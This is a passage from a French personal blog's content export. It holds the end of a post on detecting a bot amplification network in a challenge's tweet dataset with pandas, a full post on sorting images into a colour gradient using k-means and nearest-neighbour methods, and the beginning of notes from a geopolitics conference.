Un écart type de 50 ou 100 aurait été la marque d\u0026rsquo;un réseau plus homogène, potentiellement composé exclusivement d\u0026rsquo;humains.\nSi on affiche les 20 comptes les plus actifs, on se rend clairement compte qu\u0026rsquo;une grosse partie du traffic n\u0026rsquo;est pas naturelle :\nnumber_of_tweet_by_pseudo = df[\u0026#39;username\u0026#39;].value_counts() number_of_tweet_by_pseudo.head(20) r2d2x1977 30000 nonox1981 30000 mariax1927 30000 terminatorx1984 30000 goldorakx1975 30000 c3pox1977 30000 rodneyx2005 30000 wallex2008 30000 tinmanx1939 30000 robocopx1987 30000 cyber-rider 30000 valletyves 379 mathilde72 379 guerinmadeleine 378 jacquesvictor 376 gerard98 376 bertrandcarlier 376 hoareaususan 374 andree94 373 bonneauthibaut 372 Les 11 comptes les plus actifs ont exactement le même nombre de tweets et pire que cela, ils tweet 100 fois plus que les autres.\nDes robots, mais pour quoi faire ? # Des robots, oui, mais pour quoi faire ? On nous a parlé de \u0026ldquo;campagne de désinformation\u0026rdquo;, mais que disent-ils ces robots au juste ? Intéressons-nous à certains de leurs tweets :\n# affiche n tweets des pseudos ciblés def display_tweets_from_bots(accounts, n, df): for username in accounts: print(username) i = 0 for index, data in df.iterrows(): if data[\u0026#39;username\u0026#39;] == username and i \u0026lt; n: i+=1 print(data[\u0026#39;text\u0026#39;]) elif i==n: break number_of_tweet_by_pseudo = df[\u0026#39;username\u0026#39;].value_counts() # on a 11 comptes qui ont tous 30k tweets exactement # on regarde ce qu\u0026#39;ils tweets accounts = number_of_tweet_by_pseudo.head(11) accounts = accounts.to_dict().keys() display_tweets_from_bots(accounts, 5, df) r2d2x1977 RT @MariaX1927 Ut porro magnam labore est etincidunt numquam. RT @TerminatorX1984 Dolore quaerat ut velit. RT @GoldorakX1975 Dolore porro quiquia tempora. RT @GoldorakX1975 Quisquam neque modi ipsum magnam est porro amet. RT @WallEX2008 Numquam quiquia sed dolor. nonox1981 RT @MariaX1927 Ut porro magnam labore est etincidunt numquam. RT @TerminatorX1984 Dolore quaerat ut velit. RT @WallEX2008 Numquam quiquia sed dolor. RT @GoldorakX1975 Dolore porro quiquia tempora. RT @GoldorakX1975 Quisquam neque modi ipsum magnam est porro amet. mariax1927 Ut porro magnam labore est etincidunt numquam. RT @TerminatorX1984 Dolore quaerat ut velit. RT @WallEX2008 Numquam quiquia sed dolor. RT @GoldorakX1975 Quisquam neque modi ipsum magnam est porro amet. RT @GoldorakX1975 Dolore porro quiquia tempora. terminatorx1984 Dolore quaerat ut velit. RT @MariaX1927 Ut porro magnam labore est etincidunt numquam. RT @WallEX2008 Numquam quiquia sed dolor. RT @GoldorakX1975 Quisquam neque modi ipsum magnam est porro amet. RT @GoldorakX1975 Dolore porro quiquia tempora. goldorakx1975 Quisquam neque modi ipsum magnam est porro amet. Dolore porro quiquia tempora. RT @TerminatorX1984 Dolore quaerat ut velit. RT @MariaX1927 Ut porro magnam labore est etincidunt numquam. RT @WallEX2008 Numquam quiquia sed dolor. c3pox1977 RT @TerminatorX1984 Dolore quaerat ut velit. RT @MariaX1927 Ut porro magnam labore est etincidunt numquam. RT @GoldorakX1975 Dolore porro quiquia tempora. RT @GoldorakX1975 Quisquam neque modi ipsum magnam est porro amet. RT @WallEX2008 Numquam quiquia sed dolor. rodneyx2005 RT @MariaX1927 Ut porro magnam labore est etincidunt numquam. RT @TerminatorX1984 Dolore quaerat ut velit. RT @GoldorakX1975 Quisquam neque modi ipsum magnam est porro amet. RT @GoldorakX1975 Dolore porro quiquia tempora. RT @WallEX2008 Numquam quiquia sed dolor. wallex2008 Numquam quiquia sed dolor. RT @MariaX1927 Ut porro magnam labore est etincidunt numquam. RT @TerminatorX1984 Dolore quaerat ut velit. RT @GoldorakX1975 Quisquam neque modi ipsum magnam est porro amet. RT @GoldorakX1975 Dolore porro quiquia tempora. tinmanx1939 RT @TerminatorX1984 Dolore quaerat ut velit. RT @MariaX1927 Ut porro magnam labore est etincidunt numquam. RT @GoldorakX1975 Quisquam neque modi ipsum magnam est porro amet. RT @WallEX2008 Numquam quiquia sed dolor. RT @GoldorakX1975 Dolore porro quiquia tempora. robocopx1987 RT @MariaX1927 Ut porro magnam labore est etincidunt numquam. RT @TerminatorX1984 Dolore quaerat ut velit. RT @GoldorakX1975 Quisquam neque modi ipsum magnam est porro amet. Sed sed sit sed ipsum. RT @WallEX2008 Numquam quiquia sed dolor. cyber-rider RT @TerminatorX1984 Dolore quaerat ut velit. RT @MariaX1927 Ut porro magnam labore est etincidunt numquam. RT @WallEX2008 Numquam quiquia sed dolor. RT @GoldorakX1975 Dolore porro quiquia tempora. RT @GoldorakX1975 Quisquam neque modi ipsum magnam est porro amet. On observe qu\u0026rsquo;ils produisent tous du contenu\u0026hellip; en latin. Les comptes plus naturels, eux, restent en anglais. Cependant, il semblerait quand dans les tweets que nous avons mis au jour, il y ait beaucoup de retweet (RT). De plus, ces RT concernent systématiquement d\u0026rsquo;autres membres du réseau. En clair, ils se retweet entre-eux. Passons outre le latin et intéressons-nous un peu à ce comportement.\nRéseautage et amplification # Manifestement, la solution se trouve dans ces 11 comptes. La supposition peut sembler infondée et plus tenir de l\u0026rsquo;intuition que d\u0026rsquo;une méthode rigoureuse, j\u0026rsquo;y reviendrai à la fin de l\u0026rsquo;article.\nSi l\u0026rsquo;on considère ces 11 comptes comme faisant partie d\u0026rsquo;un réseau, on peut étudier les relations en son sein. Quelles sont les relations entre ces comptes ? Que font-ils exactement ?\nLa seule relation que deux comptes peuvent avoir est le RT. De plus, on peut savoir si un compte a RT un tweet d\u0026rsquo;un autre compte, lui aussi appartenant au réseau. Ce faisant, on peut comprendre un peu mieux la structure du réseau et ce que les bots y font.\ndef network(accounts, df): for username in accounts: inside_network, outside_network, not_rt = 0, 0, 0 for index, data in df.iterrows(): # tweet d\u0026#39;un bot if data[\u0026#39;username\u0026#39;] == username: # rt d\u0026#39;un bot if \u0026#39;@\u0026#39; in data[\u0026#39;text\u0026#39;]: has_bot = False for a in accounts: if a.lower() in data[\u0026#39;text\u0026#39;].lower(): has_bot = True if has_bot: inside_network += 1 else: outside_network += 1 else: not_rt += 1 print(username, \u0026#39;inside network\u0026#39;, inside_network, \u0026#39;outside network\u0026#39;, outside_network, \u0026#39;not retweet\u0026#39;, not_rt) Cette fonction va afficher, pour chaque robot, le type de relation entretenue avec les autres membres.\nr2d2x1977 inside network 27000 outside network 0 not retweet 3000 nonox1981 inside network 27000 outside network 0 not retweet 3000 mariax1927 inside network 27000 outside network 0 not retweet 3000 terminatorx1984 inside network 27000 outside network 0 not retweet 3000 goldorakx1975 inside network 27000 outside network 0 not retweet 3000 c3pox1977 inside network 27000 outside network 0 not retweet 3000 rodneyx2005 inside network 27000 outside network 0 not retweet 3000 wallex2008 inside network 27000 outside network 0 not retweet 3000 tinmanx1939 inside network 27000 outside network 0 not retweet 3000 robocopx1987 inside network 27000 outside network 0 not retweet 3000 cyber-rider inside network 30000 outside network 0 not retweet 0 On observe que tous les membres du réseau restent entre-eux. Ils ne communiquent pas à l\u0026rsquo;extérieur de leur bulle. Il y a très peu de contenu produit, la majorité étant republié (que 3000 tweets qui ne sont pas des re-publications), ce qui corrobore ce qui a été dit plus haut. Enfin, il n\u0026rsquo;y a qu\u0026rsquo;un seul compte qui est différent des autres : cyber-rider. Celui là ne re-publie rien mais tout ce qu\u0026rsquo;il produit est relayé dans le réseau. En d\u0026rsquo;autres termes, il produit le contenu qui est ensuite amplifié artificiellement au sein du réseau. C\u0026rsquo;est le compte qui est à l\u0026rsquo;origine de la \u0026ldquo;campagne de désinformation\u0026rdquo;.\ncyber-rider est la réponse au challenge Pour résumer, dans la masse de contenu, se dessine un réseau de 11 comptes dont l\u0026rsquo;un d\u0026rsquo;eux se contente de produire du contenu tandis que les autres le partage entre-eux.\nLutte d\u0026rsquo;influence informatique # Revenons un peu sur la thématique globale du challenge. Ce sujet de lutte d\u0026rsquo;influence informatique, abrégé L2I, monte depuis plusieurs années. Le Ministère des Armées la définit comme suit :\nLa lutte informatique d’influence (L2I) désigne les opérations militaires conduites dans la couche informationnelle du cyberespace pour y détecter, caractériser et contrer les attaques, renseigner ou faire de la déception, de façon autonome ou en combinaison avec d’autres opérations.\nCe type d\u0026rsquo;attaque, nombre de pays y sont confrontés, dont la France et plus particulièrement dans le cadre d\u0026rsquo;opérations militaires au Sahel. Ces opérations de désinformation visent à salir l\u0026rsquo;image de la France en Afrique au profit d\u0026rsquo;autre puissance, comme la Russie. Tous les pays et toutes les organisations peuvent être touchés par cette nouvelle forme d\u0026rsquo;agression. Pour plus d\u0026rsquo;information, je vous invite à consulter ces ressources :\nCourrier International. 2022. \u0026ldquo;Guerre de l’ombre. En Afrique de l’Ouest, l’offensive des réseaux russes de désinformation\u0026rdquo;. Arte. \u0026ldquo;Guerre de l\u0026rsquo;info: au coeur de la machine Russe\u0026rdquo; Editions Puf \u0026ldquo;Les guerres de l\u0026rsquo;information à l\u0026rsquo;ère numérique\u0026rdquo;. 2021. Céline Marangé \u0026amp; Maud Quessard. L\u0026rsquo;un de mes projets d\u0026rsquo;étude porte sur cette thématique et j\u0026rsquo;espère pouvoir écrire dessus un jour. Ce sujet me tiens à coeur, il est vital pour nos démocraties et riche de connaissance et de découverte.\nCritique # Vous l\u0026rsquo;aurez remarqué, la notion de désinformation est toute relative. Il n\u0026rsquo;empêche que l\u0026rsquo;on peut se questionner sur la portée d\u0026rsquo;une désinformation qui, de toute évidence, n\u0026rsquo;est rien d\u0026rsquo;autre que du Lorem Ipsum. Ce texte en latin ne vise ni le personnage mentionné dans l\u0026rsquo;énnoncé ni le pays fictif. Il aurait peut-être été plus intéressant d\u0026rsquo;être plus proche de la réalité, avec un réseau de robot moins bruyant et plus efficient. Cependant, ce challenge a été l\u0026rsquo;occasion de s\u0026rsquo;initier à la data science, la L2I et l\u0026rsquo;utilisation d\u0026rsquo;outils tout en apportant un style de challenge dont on a peu l\u0026rsquo;habitude.\n","date":"8 janvier 2023","permalink":"/posts/fakenews/","section":"Mes articles","summary":"Article de blog écrit à la suite du Tournois de Renseignement et d\u0026rsquo;Analyse de CentraleSupélec (TRACS) édition 2022.","title":"Voir l'influence et détecter la manipulation de l'information"},{"content":"Trier des images pour les classer en dégradé de couleur, voilà quelque chose qui paraît trivial et sans intérêt au premier abord, et si c\u0026rsquo;était en réalité beaucoup plus difficle et intéressant que ça ? Le code en Python est disponible sur mon Github.\nUn feed Instagram pas comme les autres # Le feed est l\u0026rsquo;ensemble des publications d\u0026rsquo;un compte Instagram, c\u0026rsquo;est là où sont regroupées toutes vos photos, vos réels etc\u0026hellip; C\u0026rsquo;est la partie visible du compte, il doit être le plus attirant possible afin de susciter de l\u0026rsquo;engagement.\nJe discutais avec une amie à propos de mon bot Instagram, @archie_the_aesthete, qui ne trouve pas son public (d\u0026rsquo;ailleurs si vous voulez savoir comment je l\u0026rsquo;ai créé, je vous invite à lire mon article à ce propos : J\u0026rsquo;ai créé un bot Instagram 100% légal et totalement automatisé). Selon elle, le principal défaut de mon bot est qu\u0026rsquo;il n\u0026rsquo;a pas un beau feed. Pour illustrer l\u0026rsquo;importance de ce critère, elle me fait découvrir le compte Insta de @charlie__danger, tout en se demandant comment cette créatrice peut faire pour arriver à un tel résultat. Je vous invite d\u0026rsquo;ailleurs à suivre cette personne sur Youtube si vous aimez l\u0026rsquo;Archéologie et l\u0026rsquo;Histoire.\nUne partie du feed Instagram de Charlie Danger, une créatrice de contenu sur internet. En haut à gauche les photos les plus récentes, en bas à droite les plus anciennes. J\u0026rsquo;émets alors l\u0026rsquo;hypothèse d\u0026rsquo;un algorithme qui classerait les images, tout en imaginant les grandes ligne du programme. Je lui indique alors que cela ne me semble pas compliqué au premier abord (quelle erreur à posteriori !) et que je pourrais même le développer pour elle. Je n\u0026rsquo;imaginais pas tout ce qui se cachait derrière\u0026hellip;\nUne approche bien trop naïve # La première étape est d\u0026rsquo;extraire, pour chaque image, les informations permettant de savoir si elle est plutôt bleue, verte ou jaune. J\u0026rsquo;ai tout d\u0026rsquo;abord pensé à extraire la couleur moyenne de chaque image, je suis tombé sur cette question Stackoverflow : How to find the average colour of an image in Python with OpenCV?. Là-bas, un utilisateur visiblement bien plus callé en imagerie que moi conseille plutôt d\u0026rsquo;utiliser les couleurs dominantes plutôt que la couleur moyenne. Pourquoi ? Car la couleur moyenne ne fait pas resortir les dominantes de couleurs que l\u0026rsquo;humain voit, or, c\u0026rsquo;est justement ce que je recherche ici ; créer de la cohérence pour l\u0026rsquo;oeil humain.\nIl explique et illustre le concept de couleur dominante d\u0026rsquo;une image dont voici une traduction en français (reponse de Tonechas sur le post Stackoverflow, je vous invite à lire sa réponse si le sujet vous intéresse, c\u0026rsquo;est très bien détaillé) :\nUne image de Légo avec une dominante rouge. Voyons comment se présentent ces couleurs pour mieux comprendre les différences entre les deux approches. Dans la partie gauche de la figure ci-dessous est affichée la couleur moyenne. Il apparaît clairement que la couleur moyenne calculée ne décrit pas correctement le contenu en couleur de l'image originale. En fait, il n'y a pas un seul pixel avec cette couleur dans l'image originale. La partie droite de la figure montre les cinq couleurs les plus représentatives triées de haut en bas par ordre décroissant d'importance (fréquence d'apparition). Cette palette met en évidence que la couleur dominante est le rouge, ce qui est cohérent avec le fait que la plus grande région de couleur uniforme dans l'image originale correspond à la pièce de Lego rouge. Résultat du calcul couleur moyenne (gauche) VS couleurs dominantes (droite). Du calcul de \u0026ldquo;K-means clustering\u0026rdquo; # Théorie # Une méthode pour calculer les couleurs dominantes est le K-means clustering, ou K-moyennes en français. Je ne vais pas rentrer dans les détails de cette méthode, déjà car je ne suis pas compétent, mais également car ça n\u0026rsquo;est pas le sujet de l\u0026rsquo;article. Je vous invite à consulter cette page : Wikipédia - k-means clustering si le sujet vous intéresse (la page en anglais est plus complète que celle en français). Car une illustration vaut plus que mille mots, ce gif devrait vous aider à sentir ce que permet de faire le k-mean-clustering.\nLes informations ci-dessous peuvent être imprécises ou fausses. Pour plus d\u0026rsquo;information, consultez Wikipédia - k-means clustering. Cette animation ci-dessous montre qu\u0026rsquo;au fur et à mesure des itérations, nos 3 points noirs se rapprochent de ce qui semble être 3 points moyens de nos 3 sous-ensembles (rouge, jaune et bleu), on appelle ça les centres de cluster, ou centroïdes de cluster. C\u0026rsquo;est ce qu\u0026rsquo;on appelle la convergence des k-moyennes. Ici, on a définit arbitrairement qu\u0026rsquo;il nous fallait découper tous nos points en 3 sous-ensemble, ça aurait pu être 4, 2, 37\u0026hellip; On a aussi définit arbitrairement qu\u0026rsquo;il fallait itérer (faire le calcul) 14 fois, plus on met d\u0026rsquo;itération et plus on se rapproche de la véritable moyenne (mais plus les calculs sont longs). L\u0026rsquo;idée étant de tendre vers k points (ici 3) qui sont au plus proches de tous les autres points du sous-ensemble. Ce faisant, on partitionne nos données en k-ensemble.\nAnimation qui montre la convergence de 3 centroïdes de cluster sur cet ensemble de données au fur et à mesure des itérations (calculs de distance). Ce qu\u0026rsquo;il faut retenir ici, c\u0026rsquo;est que cette méthode nous permet d\u0026rsquo;obtenir les k-premières couleurs dominantes d\u0026rsquo;une image. Pratique avec exemples # J\u0026rsquo;ai choisi de régler mon calcul des k-moyennes de sorte à trouver les 5 couleurs dominantes en 300 itérations (valeur par défaut). Peut-être que ces paramètres ne sont pas optimaux en terme de performance (on verra plus bas que ce sont ces calculs qui ralentissent mon programme), mais pour le moment ils me suffisent à produire un résultat satisfaisant.\nVoici plusieurs exemples pour se convaincre que cette méthode produit des résultats intéressants, sous chaque image vous avez les 5 couleurs dominantes produites à partir de la méthodes des k-means clustering, plus la couleur est dominante, plus le rectangle associé est grand :\n4 exemples de l'extraction des 5 couleurs dominantes d'une image avec la méthode des k-means clustering. Le tri : encore une approche naïve # Maintenant que je suis parvenu à isoler les couleurs dominantes de mes images, il faut les classer pour obtenir un dégradé de couleur. J\u0026rsquo;ai donc créé une structure de donnée qui se présente comme suit :\n{ \u0026#39;image1.jpg\u0026#39;: [ [pourcentage_couleur1, R, G, B], [pourcentage_couleur2, R, G, B], [pourcentage_couleur3, R, G, B], [pourcentage_couleur4, R, G, B], [pourcentage_couleur5, R, G, B] ], \u0026#39;image2.png\u0026#39;:[ [pourcentage_couleur1, R, G, B], [pourcentage_couleur2, R, G, B], [pourcentage_couleur3, R, G, B], [pourcentage_couleur4, R, G, B], [pourcentage_couleur5, R, G, B] ], ... } Chaque image est indexée par son nom et comporte ses données associées. Il reste ensuite à les classer. Ma première apprcoche fut la suivante :\nprendre la première couleur dominante de ma première image dans ma structure parcourir toutes les autres images et trouver celle qui a la couleur dominante la plus proche de mon image courante sauvegarder cette seconde image comme étant la plus proche de ma première supprimer cette image de ma structure de donnée recommencer jusqu\u0026rsquo;à ce qu\u0026rsquo;il n\u0026rsquo;y ait plus d\u0026rsquo;image dans ma structure de donnée Vous avez dit une couleur proche ? # parcourir toutes les autres images et trouver celle qui a la couleur dominante la plus proche de mon image courante Comment faire ça ? Une approche intuitive serait de calculer la distance entre 2 couleurs. Une couleur peut être représentée par 3 entiers : sa composante rouge, verte et bleue, allant de 0 à 255. C\u0026rsquo;est ce qu\u0026rsquo;on appelle le RGB. On peut donc représenter une couleur comme étant un point dans un espace en 3 dimensions. Un bleu foncé aura cette représentation RGB :\nred: 0, green: 18:, blue: 101 ce qui donne cette couleur : A noter qu\u0026rsquo;il existe d\u0026rsquo;autres représentation des couleurs, comme HSL ou CIELAB par exemple. Pour plus d\u0026rsquo;information, je vous invite à consulter cette page Wikipédia : Espace de couleur. Puisqu\u0026rsquo;une couleur est un point, on peut calculer une distance entre deux points. Pour cela rien de plus simple ; soient deux couleurs c1 et c2 avec pour coordonnées respectivement rc1, gc1, bc1 et rc2, gc2, bc2, alors la distance entre ces deux couleurs se calcule comme étant :\ndistance = (r, g, b) distance = (rc2-rc1, gc2-gc1, bc2-bc1) Une distance étant toujours positive, je fais passer mes trois composantes dans la fonction valeur absolue. Pour rappel : valeur_absolue(-3) = 3 et valeur_absolue(5) = 5. Je fais cela pour toutes mes images et je sélectionne l\u0026rsquo;image qui a la distance la plus courte par rapport à l\u0026rsquo;image que je souhaite classer.\nJ\u0026rsquo;ai vite observé que cette méthode de calcul de distance ne fonctionnait pas. Le défaut est qu\u0026rsquo;on ne s\u0026rsquo;intéresse qu\u0026rsquo;à la couleur la plus dominante. Si on calcule la moyenne pondérée (rappelez-vous, on dispose également du pourcentage de chaque couleur dominante) des 5 couleurs dominantes de l\u0026rsquo;image et qu\u0026rsquo;on calcule ensuite la distance, l\u0026rsquo;algorithme sort un tris intéressant :\nComparatif de tris entre la méthode de calcul de distance à partir de la couleur dominante (gauche) et la méthode de la moyenne pondérée des couleurs dominantes (droite). Le tris : pas si simple qu\u0026rsquo;il n\u0026rsquo;y paraît # Le résultat commence à prendre forme mais il y a encore un problème : plus on approche de la fin et moins les images semblent triées. Cela est dû au fait que plus on approche de la fin : plus le choix restant dans les images est limité. Rappelez-vous : on supprime au fur et à mesure les images triées de notre structure de donnée. Pour autant, on ne peut pas laisser les images triées dans notre structure, on tournerait en rond\u0026hellip;\nSecond problème, les images ne sont pas vraiment regroupées par couleurs. Ou plutôt, elles ne sont pas regroupées totalement par couleur. On l\u0026rsquo;observe déjà sur la partie droite de l\u0026rsquo;image précédente : on commence par les bleues, suivent les jaunes, puis de nouveau quelques bleues.\nTroisième problème, et pas des moindres, ce que j\u0026rsquo;appelle des divergences locales. Pour illustrer cette idée : regardons le tris produit ci-dessous sur une population plus importante d\u0026rsquo;images.\nIllustration des \"divergences locales\", entourées en orange. On observe quelques incohérences, j\u0026rsquo;en ai encadré certaines. Mon hypothèse est que cela est dû à une divergence du tris, je m\u0026rsquo;explique. Posons six images : A, B, C, D, E et F. Posons que A, B, C et D soient globalement vertes-bleues, et E bleue-jaune (elle apparaîtra donc verte puisqu\u0026rsquo;on va faire une moyenne) et F jaune. On peut supposer que notre algorithme fasse ce tris :\nA ce moment, on observe bien une divergence à partir de C en direction du vert puis du jaune, avant de retourner au bleu plus foncé qui avait été ignoré. A noter que ce problème est différent que le premier énoncé. En effet, il peut rester suffisement d\u0026rsquo;images après D et une divergence pourra quand même se produire, c\u0026rsquo;est ce qu\u0026rsquo;on observe sur l\u0026rsquo;image avec les encadrés oranges. Cela produira nécessairement une rupture dans notre dégradé alors qu\u0026rsquo;une meilleure solution est possible.\nUn problème sans solution # Alors je me suis creusé la tête pendant longtemps pour trouver une solution à ce problème. Plus je creusais et plus cela me semblait difficile\u0026hellip; J\u0026rsquo;ai tenté une approche par les graphes, une sorte de plus court chemin et je suis arrivé à la conclusion qu\u0026rsquo;il me fallait un ordre total entre toutes les couleurs de mes images. Cela me permettrait d\u0026rsquo;avoir le meilleur tris possible. Pour ceux qui désirent savoir ce qu\u0026rsquo;est un ordre total, je vous invite à lire cette page : Wikipédia - Ordre total.\nJe suis alors tombé sur cet article véritablement passionnant qui répondait en partie à mon problème : The incredibly challenging task of sorting colours. Surprise, il est question d\u0026rsquo;ordre total ! J\u0026rsquo;étais sur la bonne voie\u0026hellip; Mes espoirs ont cependant été vites douchés lorsque j\u0026rsquo;ai lu ces lignes :\nSupposons que vous représentiez des couleurs avec leurs valeurs RVB, il n'existe pas de moyen standard d'ordonner les triplets dans une ligne, puisqu'ils ne sont naturellement pas organisés de manière linéaire. [...] Je peux vous arrêter ici et vous dire qu'il n'y a pas de solution à ce problème. Bon, à priori ma recherche était vaine mais la suite de l\u0026rsquo;article détaille le problème et propose des solutions. Je vous invite à le lire mais la solution que j\u0026rsquo;ai retenue est celle des plus proches voisins.\nNos chers voisins\u0026hellip; # Parce qu\u0026rsquo;il n\u0026rsquo;y avait pas encore assez de pages wikipédia ici, je vais en rajouter une (la dernière), celle à propos de l\u0026rsquo;algorithme des plus proches voisins : Wikipédia - Nearest neighbour algorithm. Sans rentrer dans le détail, cet algorithme permet de trouver un chemin \u0026ldquo;optimal\u0026rdquo; entre des points (cf l\u0026rsquo;illustration ci-dessous). Nos points sont simplement des valeurs de couleurs, et cet algorithme permet de les trier !\nAnimation illustrant le fonctionnement de l'algorithme des plus proches voisins. A noter que cet algorithme n\u0026rsquo;est pas parfait, notamment car il ne permet pas de répondre rigoureusement (entendez par là mathématiquement) au problème du voyageur de commerce. Cependant, c\u0026rsquo;est une approximation suffisamment satisfaisante pour moi. Dernier inconvénient, la complexité de l\u0026rsquo;algorithme : O(n²). Cela signifie, en gros, que pour n images à trier, on va avoir besoin de n² opérations :\n10 images : 10² = 100 opérations 60 images (environ le nombre que j\u0026rsquo;avais pour tester mon algorithme) : 3600 opérations L\u0026rsquo;implémentation que j\u0026rsquo;ai trouvée de cet algorithme est optimisée mais on reste dans les mêmes ordres de grandeur. Les résultats obtenus sont sans appels, à gauche, l\u0026rsquo;ancien algorithme de tris, à droite, le résultat avec l\u0026rsquo;algorithme des plus proches voisins :\nComparatif des résultats des méthodes de tris. A gauche, l'ancien algorithme de tris, à droite, le résultat avec l'algorithme des plus proches voisins. Certes, il existe encore des imperfections (au début), l\u0026rsquo;algorithme n\u0026rsquo;est pas parfait mais peut-être est-ce à cause de ma moyenne pondérée. J\u0026rsquo;ai tenté d\u0026rsquo;autres approches mais aucune n\u0026rsquo;a donné un résultat aussi propre que celle-là. On observe que les divergences locales ont disparues ! C\u0026rsquo;est une réussite sur ce point là !\nOptimisations # Le programme total est assez lent sur mon ordinateur, pour les images ci-dessus, comptez plusieurs minutes. La partie la plus longue est assurément le calcul de clustering ; pour une image de 600 * 800 px il me faut environ 50 secondes pour ce calcul. Est-il possible d\u0026rsquo;aller plus vite ? Oui, et pour cela il faut faire des tests.\nRetour sur le clustering # On l\u0026rsquo;a vu, le clustering consiste à répéter des calculs pour aboutir à plusieurs valeurs. En creusant un peu, on s\u0026rsquo;apperçoit que la librairie utilisée fait par défaut 300 itérations. Que se passe-t-il si on diminue ? Surtout, est-ce que nos valeurs de couleurs dominantes sont encore précises ?\nnombre itérations temps de calcul (s) pourcentage de temps économisé (%) résultat du clustering 300 57 - [[36, 37, 28, 22], [26, 140, 99, 43], [24, 96, 62, 25], [7, 0, 0, 0], [4, 200, 164, 115]] 150 52 9 [[36, 37, 28, 22], [26, 140, 99, 43], [24, 96, 62, 25], [7, 0, 0, 0], [4, 199, 163, 114]] 50 37 35 [[36, 37, 28, 22], [27, 139, 98, 42], [24, 96, 62, 25], [7, 0, 0, 0], [4, 199, 163, 114]] 10 31 46 [[36, 37, 28, 22], [26, 140, 99, 43], [24, 96, 62, 25], [7, 0, 0, 0], [4, 200, 163, 114]] 2 25 56 [[36, 38, 29, 22], [26, 139, 99, 42], [24, 98, 64, 25], [7, 0, 0, 0], [5, 196, 159, 110]] On voit ici qu\u0026rsquo;on peut descendre jusqu\u0026rsquo;à 2 itérations sans que nos résultats de calculs soient impactés de façon significatives, on a déjà gagné 56% de temps de calcul environ. Pour garder de la marge, j\u0026rsquo;ai choisis d\u0026rsquo;effectuer 5 itérations.\nL\u0026rsquo;estimation du temps de calcul a été fait à partir du module time. C\u0026rsquo;est une méthode de mesure largement imparfaite lorsqu\u0026rsquo;on veut être précis ou mesurer de petites différences. L\u0026rsquo;idée ici est de \u0026ldquo;sentir\u0026rdquo; les ordres de grandeur. On peut également diminuer le nombre de cluster (couleur dominante) à calculer. Cependant, diminuser le nombre de couleurs dominantes c\u0026rsquo;est perdre en précision pour des impacts sur la performance qui sont minimes. Pour 4 clusters et 5 itérations on est à 25 secondes, 3 clusters et 5 itérations : 23 secondes et enfin 2 clusters et 5 itérations : 10 secondes. Perdre ne serait-ce qu\u0026rsquo;une couleur va impacter la pertinence du tris, ça n\u0026rsquo;est pas acceptable.\nUne troisième idée est celle de réduire la taille des images seulement pour le calcul. Juste avant le calcul du clustering, on redimensionne l\u0026rsquo;image ce qui engendre une forte réduction du volume de donnée à calculer. En effet, pour une image deux fois plus petite on divise par 4 son nombre de pixels. La question reste toujours la même, jusqu\u0026rsquo;à quand peut-on réduire la taille d\u0026rsquo;une image sans que cela n\u0026rsquo;impacte trop la pertinence du tris ? J\u0026rsquo;ai fais quelques tests et la solution qui me semble être optimale dans mon cas est de fixer une taille maximale à mon image. En effet, si on divise systématiquement la taille de l\u0026rsquo;image par deux avant le clustering, notre programme ne sera pas adapté à de petites et à des très grandes images. Pour les premières il n\u0026rsquo;y aura plus assez de pixels et pour les secondes il y en aura encore bien trop.\nEn fixant une largeur maximale de 2000 pixels (la hauteur est calculée pour garder les proportions de l\u0026rsquo;image), j\u0026rsquo;observe que mes résultats ne bougent que très peu pour un gain important. Pour une image de 1.6Mo, avec les optimisations évoquées ci-dessus, on arrive à presque 85% de temps de calcul en moins.\nEnfin, on pourrait créer un fichier JSON qui contiendrait les valeurs de clustering pour chaque hash d\u0026rsquo;image. Puisqu\u0026rsquo;un hash est unique, il suffirait de hasher l\u0026rsquo;image, regarder si ce hash se trouve dans le fichier, et si c\u0026rsquo;est le cas utiliser les valeurs déjà calculées précédemment. Le gain dépend de la façon dont on utilise le programme. En effet, si on veut par exemple construire un beau dégradé, on va souvent traiter les mêmes images en ajoutant quelques nouvelles ; inutile de calculer ce qui a déjà était fait auparavant.\nConclusion # Il est fascinant de découvrir tout ce qui se cache derrière une simple idée : trier des images par couleur. A partir de cette simple demande, j\u0026rsquo;ai découvert énormément de choses passionnantes. Il est intéressant de constater que plusieurs des techniques évoquées (clustering, proches voisins) sont utilisées dans d\u0026rsquo;autres pans de l\u0026rsquo;informatique, comme la Data Science ou l\u0026rsquo;Intelligence Artificielle. Il y aurait encore tant à dire et à explorer, je n\u0026rsquo;ai bien entendu pas pu tout mettre ici mais je vous invite vivement à lire les articles mentionnés ici.\nJ\u0026rsquo;espère que vous aurez pris plaisir à me lire, autant, je l\u0026rsquo;espère, que j\u0026rsquo;en ai pris à découvrir et partager ces savoirs.\n","date":"23 octobre 2022","permalink":"/posts/creer-un-degrade-dimage-un-vrai-defi/","section":"Mes articles","summary":"Trier des images pour les classer en dégradé de couleur, voilà quelque chose qui paraît trivial et sans intérêt au premier abord, et si c\u0026rsquo;était en réalité beaucoup plus difficle et intéressant que ça ?","title":"Créer un dégradé d'image : un vrai défi"},{"content":"Café stratégique du 27 septembre 2022\nConférencier : Roger DUBURG, Ancien directeur adjoint de la Délégation aux Affaires Stratégiques du ministère de la défense.\nAvant-propos # Cet article est tiré de mes notes lors d\u0026rsquo;une conférence. Certaines informations peuvent être incomplètes. Je ne fais ici que restituer du mieux que je peux ce que j\u0026rsquo;ai compris. Ceci n\u0026rsquo;est ni une prise de position, ni un article journalistique sur le conflit en cours. Le but est de transmettre l\u0026rsquo;information et d\u0026rsquo;en faire profiter le plus grand nombre en la rendant accessible au plus grand nombre.\nC\u0026rsquo;est la géographie qui dicte la politique des Etats - Napoléon # En France, nous sommes mal placés pour savoir ce qui se passe en Europe Orientale. L\u0026rsquo;Europe de l\u0026rsquo;ouest, et plus encore la France, ont un environnement homogène du point de vue de la géographie. Les frontières naturelles sont nombreuses et ne sont pas propices à des affrontements entre voisins, à la différence de l\u0026rsquo;Europe de l\u0026rsquo;est.\nEn effet, on peut vulgariser l\u0026rsquo;Europe Centrale et de l\u0026rsquo;est comme étant une grande plaine s\u0026rsquo;étendant de la Baltique jusqu\u0026rsquo;à la mer Noire, de l\u0026rsquo;Allemagne à l\u0026rsquo;Oural. Cette géographie est plus propice à des affrontements car il est plus difficile de découper les territoires. Pour illustrer cela, on peut citer les arméniens et les kurdes qui sont deux peuples qui n\u0026rsquo;ont pas eu de territoires à l\u0026rsquo;issue de la première guerre mondiale. L\u0026rsquo;Arménie est aujourd\u0026rsquo;hui attaqué par son voisin l\u0026rsquo;Azerbaïdjan et les kurdes sont considérés par les Turques comme des terroristes revendiquant un 